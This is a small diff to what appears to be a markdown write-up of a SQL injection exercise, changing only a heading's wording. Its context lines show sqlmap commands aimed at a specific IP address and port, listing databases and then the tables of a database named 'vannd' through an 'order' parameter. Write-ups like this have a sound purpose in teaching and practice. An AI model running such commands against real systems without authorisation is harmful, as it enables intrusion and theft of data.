@@ -13,7 +13,7 @@ sqlmap -u http://125.235.240.166:20105/index?order=name --dbs
 ```
 ![](img3.png)
 
-List tables of vannd's database:
+List tables of vannd database:
 
 ```
 sqlmap -u http://125.235.240.166:20105/index?order=name -D vannd --tables
